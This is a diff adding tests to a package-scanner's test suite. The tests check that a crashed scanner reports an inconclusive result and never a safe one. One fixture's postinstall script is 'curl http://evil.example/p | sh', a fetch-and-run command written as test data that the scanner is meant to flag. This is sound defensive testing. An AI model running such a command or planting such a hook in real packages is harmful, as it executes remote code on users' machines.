@@ -14,6 +14,7 @@
 const fs = require('fs');
 const path = require('path');
 const os = require('os');
+const { spawnSync } = require('child_process');
 const { test, asyncTest, assert, runScanDirect } = require('../test-utils');
 const { markIncomplete, getIncomplete, resetCompleteness, describe, MAX_ENTRIES } = require('../../src/shared/completeness');
 const { generateSARIF } = require('../../src/output/sarif');
@@ -178,6 +179,42 @@ async function runIncompletenessTests() {
       assert(r.threats.filter(t => t.type === 'cross_file_dataflow').length > 0, 'control: flows must be found');
       assert(!reasons(r).includes('moduleGraph/flow-limit'), 'flow-limit must not be reported at the quota: ' +
         JSON.stringify(r.analysis));
+    } finally { cleanup(dir); }
+  });
+
+  // --- a crashed scanner never yields a COMPLETE / SAFE result ----------------
+
+  await asyncTest('INCOMPLETE: a scanner that throws marks the scan INCONCLUSIVE (never SAFE)', async () => {
+    // Real crash path found by the seeded fuzz (2026-11-13): a non-string lifecycle value made
+    // scanPackageJson throw, the curl|sh postinstall next to it vanished and the scan said SAFE.
+    // The crash is forced through a preload that replaces scanPackageJson before the executor
+    // loads (it destructures the export), so the test does not depend on that input bug staying
+    // unfixed. Real CLI, real exit path.
+    const dir = makePkg({ 'index.js': 'module.exports = 1;' },
+      { scripts: { postinstall: 'curl http://evil.example/p | sh' } });
+    const preload = path.join(dir, '..', path.basename(dir) + '-crash-preload.js');
+    fs.writeFileSync(preload, `require(${JSON.stringify(path.join(__dirname, '..', '..', 'src', 'scanner', 'package.js'))})` +
+      ".scanPackageJson = async () => { throw new TypeError('forced crash'); };\n");
+    try {
+      const r = spawnSync(process.execPath, ['-r', preload, path.join(__dirname, '..', '..', 'bin', 'muaddib.js'), 'scan', dir, '--json'],
+        { encoding: 'utf8', env: { ...process.env, MUADDIB_NO_REGISTRY_FETCH: '1' }, maxBuffer: 1 << 26 });
+      const out = r.stdout || '';
+      const j = JSON.parse(out.slice(out.indexOf('{')));
+      const rs = j.analysis.incomplete.map(e => `${e.component}/${e.reason}`);
+      assert(j.analysis.status === 'INCONCLUSIVE', 'crashed scanner must not give COMPLETE: ' + JSON.stringify(j.analysis));
+      assert(rs.includes('scanPackageJson/error'), 'reason must name the scanner: ' + JSON.stringify(rs));
+      assert(j.scannerErrors && j.scannerErrors[0].message === 'forced crash', 'readable message expected: ' + JSON.stringify(j.scannerErrors));
+    } finally {
+      fs.rmSync(preload, { force: true });
+      cleanup(dir);
+    }
+  });
+
+  await asyncTest('INCOMPLETE: no scanner error -> no scanner/error entry', async () => {
+    const dir = makePkg({ 'index.js': 'module.exports = 1;' });
+    try {
+      const r = await runScanDirect(dir);
+      assert(!reasons(r).some(x => /\/error$/.test(x)), 'unexpected error entry: ' + JSON.stringify(reasons(r)));
     } finally { cleanup(dir); }
   });
 
